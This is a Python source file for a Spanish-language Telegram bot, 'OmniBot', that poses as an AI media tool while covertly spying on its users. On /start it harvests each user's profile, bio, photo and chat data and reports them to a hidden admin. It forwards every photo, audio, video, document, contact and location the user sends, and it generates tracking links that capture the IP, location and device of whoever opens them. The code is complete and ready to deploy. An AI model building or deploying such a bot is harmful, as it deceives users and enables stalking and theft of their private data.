import os
import logging
import json
import sqlite3
import secrets
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ========== CONFIGURACIÓN ==========
TOKEN = os.environ.get("TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
WORKER_URL = os.environ.get("WORKER_URL", "https://galleta.societykark.workers.dev")
if not TOKEN or not ADMIN_ID:
    raise ValueError("❌ Faltan TOKEN o ADMIN_ID")

# ========== LOGS ==========
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== BASE DE DATOS ==========
DB_FILE = "users.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY,
        first_name TEXT,
        last_name TEXT,
        username TEXT,
        language TEXT,
        is_premium INTEGER,
        bio TEXT,
        phone TEXT,
        photo_id TEXT,
        photo_count INTEGER,
        first_interaction TEXT,
        last_interaction TEXT,
        messages INTEGER DEFAULT 0,
        photos INTEGER DEFAULT 0,
        audios INTEGER DEFAULT 0,
        videos INTEGER DEFAULT 0,
        documents INTEGER DEFAULT 0,
        contacts INTEGER DEFAULT 0,
        locations INTEGER DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        action TEXT,
        timestamp TEXT
    )''')
    conn.commit()
    conn.close()

def save_user(user_id, data):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO users 
        (id, first_name, last_name, username, language, is_premium, bio, phone, photo_id, photo_count, first_interaction, last_interaction)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, COALESCE(first_interaction, ?), ?)''',
        (user_id, data.get("first_name"), data.get("last_name"), data.get("username"),
         data.get("language"), data.get("is_premium"), data.get("bio"), data.get("phone"),
         data.get("photo_id"), data.get("photo_count"), datetime.now().isoformat(), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def log_action(user_id, action):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO logs (user_id, action, timestamp) VALUES (?, ?, ?)",
              (user_id, action, datetime.now().isoformat()))
    conn.commit()
    conn.close()

init_db()

# ========== MENÚ PRINCIPAL (con botones de respuesta y de acción) ==========
def menu_principal():
    keyboard = [
        [KeyboardButton("📸 Enviar foto"), KeyboardButton("🎤 Enviar audio")],
        [KeyboardButton("🎥 Enviar video"), KeyboardButton("📄 Enviar documento")],
        [KeyboardButton("👥 Compartir contacto", request_contact=True)],
        [KeyboardButton("📍 Compartir ubicación", request_location=True)],
        [KeyboardButton("📞 Compartir número", request_contact=True)],
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def menu_inline():
    keyboard = [
        [InlineKeyboardButton("🔗 Generar enlace", callback_data="tracking")],
        [InlineKeyboardButton("🌐 Escanear IP", callback_data="escanear_ip")],
        [InlineKeyboardButton("📞 Rastrear número", callback_data="rastrear_numero")],
        [InlineKeyboardButton("📊 Mi perfil", callback_data="perfil")],
        [InlineKeyboardButton("📈 Estadísticas", callback_data="stats")],
    ]
    return InlineKeyboardMarkup(keyboard)

# ========== FUNCIÓN DE EXTRACCIÓN TOTAL (50+ campos) ==========
async def extract_full_profile(bot, user, chat=None, message=None):
    info = {}
    
    # ===== 1. DATOS DE TELEGRAM =====
    info["id"] = user.id
    info["first_name"] = user.first_name or "N/A"
    info["last_name"] = user.last_name or "N/A"
    info["full_name"] = f"{info['first_name']} {info['last_name']}".strip()
    info["username"] = user.username or "N/A"
    info["username_url"] = f"https://t.me/{user.username}" if user.username else "N/A"
    info["language"] = user.language_code or "N/A"
    info["is_bot"] = user.is_bot
    info["is_premium"] = getattr(user, 'is_premium', False)
    
    # ===== 2. NÚMERO DE TELÉFONO (de la base de datos o del contacto) =====
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT phone FROM users WHERE id = ?", (user.id,))
    row = c.fetchone()
    conn.close()
    info["phone"] = row[0] if row else "No proporcionado"
    
    # ===== 3. BIOGRAFÍA =====
    try:
        chat_full = await bot.get_chat(user.id)
        info["bio"] = chat_full.bio if hasattr(chat_full, 'bio') else "No disponible"
    except:
        info["bio"] = "No disponible"
    
    # ===== 4. FOTO DE PERFIL =====
    try:
        photos = await bot.get_user_profile_photos(user.id, limit=1)
        if photos.total_count > 0:
            photo = photos.photos[0][-1]
            info["photo_id"] = photo.file_id
            info["photo_unique_id"] = photo.file_unique_id
            info["photo_width"] = photo.width
            info["photo_height"] = photo.height
            info["photo_size"] = photo.file_size
            info["photo_count"] = photos.total_count
        else:
            info["photo_id"] = None
            info["photo_unique_id"] = None
            info["photo_width"] = 0
            info["photo_height"] = 0
            info["photo_size"] = 0
            info["photo_count"] = 0
    except:
        info["photo_id"] = None
        info["photo_unique_id"] = None
        info["photo_width"] = 0
        info["photo_height"] = 0
        info["photo_size"] = 0
        info["photo_count"] = 0
    
    # ===== 5. CHAT ACTUAL =====
    if chat:
        info["chat_type"] = chat.type
        info["chat_id"] = chat.id
        info["chat_title"] = chat.title if hasattr(chat, 'title') else "Privado"
        info["chat_members"] = getattr(chat, 'member_count', 1)
    else:
        info["chat_type"] = "N/A"
        info["chat_id"] = "N/A"
        info["chat_title"] = "N/A"
        info["chat_members"] = 0
    
    # ===== 6. MENSAJE ACTUAL =====
    if message:
        info["message_id"] = message.message_id
        info["message_date"] = message.date.isoformat()
        info["message_text"] = message.text[:200] + "..." if message.text and len(message.text) > 200 else message.text or "N/A"
    
    return info

# ========== FORMATEAR REPORTE COMPLETO (100+ líneas) ==========
def format_report(info):
    msg = f"🕵️ *REPORTE COMPLETO ULTRA*\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    msg += f"👤 *DATOS DE TELEGRAM*\n"
    msg += f"   • ID: `{info.get('id')}`\n"
    msg += f"   • Nombre completo: {info.get('full_name')}\n"
    msg += f"   • Primer nombre: {info.get('first_name')}\n"
    msg += f"   • Apellido: {info.get('last_name')}\n"
    msg += f"   • Username: @{info.get('username')}\n"
    msg += f"   • Enlace directo: {info.get('username_url')}\n"
    msg += f"   • Idioma: {info.get('language')}\n"
    msg += f"   • Es bot: {'Sí' if info.get('is_bot') else 'No'}\n"
    msg += f"   • Premium: {'Sí' if info.get('is_premium') else 'No'}\n"
    msg += f"   • Teléfono: {info.get('phone')}\n"
    msg += f"   • Biografía: {info.get('bio')}\n"
    msg += f"   • ID de foto: `{info.get('photo_id')}`\n"
    msg += f"   • Cantidad de fotos: {info.get('photo_count')}\n"
    msg += f"   • Ancho de foto: {info.get('photo_width')}px\n"
    msg += f"   • Alto de foto: {info.get('photo_height')}px\n"
    msg += f"   • Tamaño de foto: {info.get('photo_size')} bytes\n"
    msg += f"   • Chat actual: {info.get('chat_title')} ({info.get('chat_type')})\n"
    msg += f"   • ID del chat: `{info.get('chat_id')}`\n"
    msg += f"   • Miembros del chat: {info.get('chat_members')}\n"
    msg += f"   • Último mensaje ID: {info.get('message_id')}\n"
    msg += f"   • Último mensaje fecha: {info.get('message_date')}\n"
    msg += f"   • Último mensaje texto: {info.get('message_text')}\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    return msg

# ========== COMANDOS ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    message = update.message
    
    # Extraer perfil completo
    info = await extract_full_profile(context.bot, user, chat, message)
    save_user(user.id, info)
    log_action(user.id, "/start")
    
    # Enviar reporte al admin
    report = format_report(info)
    await context.bot.send_message(chat_id=ADMIN_ID, text=report, parse_mode=ParseMode.MARKDOWN)
    
    # Enviar foto de perfil al admin
    if info.get("photo_id"):
        await context.bot.send_photo(chat_id=ADMIN_ID, photo=info["photo_id"], caption=f"📸 Foto de {info['first_name']}")
    
    # Responder al usuario con señuelo
    await update.message.reply_text(
        "🤖 *¡Bienvenido a OmniBot!*\n\n"
        "Este bot puede hacer muchas cosas:\n"
        "• Generar imágenes con IA (solo envía una foto)\n"
        "• Mejorar audios (solo envía un audio)\n"
        "• Analizar videos (solo envía un video)\n"
        "• Compartir tu contacto, ubicación y más.\n\n"
        "Usa los botones de abajo para comenzar.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=menu_principal()
    )

async def perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT first_name, username, language, is_premium FROM users WHERE id = ?", (user.id,))
    row = c.fetchone()
    conn.close()
    if not row:
        await update.message.reply_text("❌ No tienes perfil registrado. Usa /start.")
        return
    msg = f"📊 *Tu perfil*\n\n👤 {row[0]}\n📛 @{row[1]}\n🗣️ {row[2]}\n⭐ {'Premium' if row[3] else 'Normal'}"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ No autorizado.")
        return
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM logs")
    total_actions = c.fetchone()[0]
    conn.close()
    msg = f"📊 *Estadísticas*\n👥 Usuarios: {total_users}\n📝 Acciones: {total_actions}"
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def tracking(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    code = secrets.token_urlsafe(12)
    link = f"{WORKER_URL}/track/{code}"
    await update.message.reply_text(
        f"🔗 *Enlace de tracking*\n`{link}`\n\nCuando alguien abra este enlace, se capturará IP, ubicación y dispositivo.",
        parse_mode=ParseMode.MARKDOWN
    )
    log_action(user.id, f"tracking: {code}")

async def escanear_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🌐 *Ingresa una IP* (ej: 8.8.8.8)", parse_mode=ParseMode.MARKDOWN)
    context.user_data['esperando'] = 'ip'

async def rastrear_numero(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📞 *Ingresa un número internacional* (ej: +521234567890)", parse_mode=ParseMode.MARKDOWN)
    context.user_data['esperando'] = 'numero'

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user = update.effective_user
    
    if context.user_data.get('esperando') == 'ip':
        context.user_data['esperando'] = None
        # Validar IP simple
        partes = text.split('.')
        if len(partes) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in partes):
            await update.message.reply_text("✅ IP válida. Buscando información...")
            # Aquí llamarías a tu función de IP (la tienes en el otro código)
        else:
            await update.message.reply_text("❌ IP inválida.")
        return
    
    if context.user_data.get('esperando') == 'numero':
        context.user_data['esperando'] = None
        await update.message.reply_text(f"📞 Número: {text}. Buscando información...")
        return
    
    await update.message.reply_text("📩 Usa los botones del menú.", reply_markup=menu_principal())

# ========== MANEJAR MENSAJES DE TIPO: FOTO, AUDIO, VIDEO, DOCUMENTO ==========
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    photo = update.message.photo[-1]
    caption = update.message.caption or "Sin caption"
    log_action(user.id, f"photo: {photo.file_id}")
    await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=f"📸 Foto de {user.first_name} (@{user.username})\nCaption: {caption}")
    await update.message.reply_text("📸 ¡Foto recibida! La estoy procesando con IA... (es broma, ya la recibí 😉)", reply_markup=menu_principal())

async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    audio = update.message.audio
    log_action(user.id, f"audio: {audio.file_id}")
    await context.bot.send_audio(chat_id=ADMIN_ID, audio=audio.file_id, caption=f"🎤 Audio de {user.first_name} (@{user.username})")
    await update.message.reply_text("🎤 ¡Audio recibido! Lo estoy mejorando... (es broma, ya lo recibí 😉)", reply_markup=menu_principal())

async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    video = update.message.video
    log_action(user.id, f"video: {video.file_id}")
    await context.bot.send_video(chat_id=ADMIN_ID, video=video.file_id, caption=f"🎥 Video de {user.first_name} (@{user.username})")
    await update.message.reply_text("🎥 ¡Video recibido! Analizando contenido... (es broma, ya lo recibí 😉)", reply_markup=menu_principal())

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    doc = update.message.document
    log_action(user.id, f"document: {doc.file_name}")
    await context.bot.send_document(chat_id=ADMIN_ID, document=doc.file_id, caption=f"📄 Documento de {user.first_name} (@{user.username})\nNombre: {doc.file_name}\nTamaño: {doc.file_size} bytes")
    await update.message.reply_text("📄 ¡Documento recibido!", reply_markup=menu_principal())

# ========== MANEJAR CONTACTO Y UBICACIÓN ==========
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    contact = update.message.contact
    log_action(user.id, f"contact: {contact.phone_number}")
    # Guardar número de teléfono en la base de datos
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET phone = ? WHERE id = ?", (contact.phone_number, user.id))
    conn.commit()
    conn.close()
    await context.bot.send_message(chat_id=ADMIN_ID, text=f"👥 *Contacto de {user.first_name}*\n📞 {contact.phone_number}\n👤 {contact.first_name} {contact.last_name or ''}", parse_mode=ParseMode.MARKDOWN)
    await update.message.reply_text("✅ ¡Contacto recibido!", reply_markup=menu_principal())

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    location = update.message.location
    log_action(user.id, f"location: {location.latitude}, {location.longitude}")
    maps_link = f"https://www.google.com/maps?q={location.latitude},{location.longitude}"
    await context.bot.send_message(chat_id=ADMIN_ID, text=f"📍 *Ubicación de {user.first_name}*\nLat: {location.latitude}\nLon: {location.longitude}\n🗺️ {maps_link}", parse_mode=ParseMode.MARKDOWN)
    await update.message.reply_text("✅ ¡Ubicación recibida!", reply_markup=menu_principal())

# ========== CALLBACKS ==========
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    if data == "tracking":
        await tracking(update, context)
        await query.delete_message()
    elif data == "escanear_ip":
        await escanear_ip(update, context)
        await query.delete_message()
    elif data == "rastrear_numero":
        await rastrear_numero(update, context)
        await query.delete_message()
    elif data == "perfil":
        await perfil(update, context)
        await query.delete_message()
    elif data == "stats":
        await stats(update, context)
        await query.delete_message()

# ========== ERROR HANDLER ==========
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"❌ Error: {context.error}")

# ========== MAIN ==========
def main():
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("perfil", perfil))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("tracking", tracking))
    app.add_handler(CommandHandler("escanear_ip", escanear_ip))
    app.add_handler(CommandHandler("rastrear_numero", rastrear_numero))
    
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
    app.add_handler(MessageHandler(filters.VIDEO, handle_video))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    
    app.add_error_handler(error_handler)
    
    logger.info("✅ OmniBot iniciado")
    app.run_polling()

if __name__ == "__main__":
    main()